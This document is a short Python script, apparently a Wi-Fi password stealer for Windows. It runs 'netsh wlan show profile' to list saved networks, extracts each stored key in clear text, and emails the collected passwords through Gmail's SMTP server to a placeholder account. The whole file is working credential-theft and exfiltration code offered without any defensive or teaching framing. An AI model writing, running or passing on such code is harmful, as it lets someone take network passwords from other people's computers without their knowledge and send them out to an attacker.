#!/usr/bin/env python

import subprocess, smtplib, re

# TODO add either argparse functionality or prompts.
email = 'INSERT EMAIL HERE'
email_password = 'INSERT EMAIL APP PASSWORD HERE'

def main():
    network_names = get_network_names()
    cracked_passwords = get_passwords(network_names)
    message = ""
    for output in cracked_passwords:
        message = message + output
    send_mail(email, email_password, message)


def send_mail(email, password, message):
    server = smtplib.SMTP("SMTP.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


def get_network_names():
    # Runs a windows command to show all saved networks and pulls their names to a list
    command = 'netsh wlan show profile'
    networks = subprocess.check_output(command, shell=True).decode()
    network_names = re.findall(r'(?<=: ).*', networks)
    for i in range(len(network_names)):
        network_names[i] = network_names[i].replace('\r', '')
    return network_names


def get_passwords(network_names):
    # Iterates over a list of network names and returns their saved passwords in windows.
    results = []
    for name in network_names:
        command = f'netsh wlan show profile "{name}" key=clear'
        try:
            current_result = subprocess.check_output(command, shell=True).decode()
            match = re.search(r'(?:.*Key Content\s*:\s*)(.*)', current_result)
            if not match:
                results.append(f'[-] No password found for {name}.')
                continue
            results.append(f'[+] Password for {name} is {match.group(1)}.')
        except subprocess.CalledProcessError as e:
            continue

            
    return results

if __name__ == '__main__':
    main()
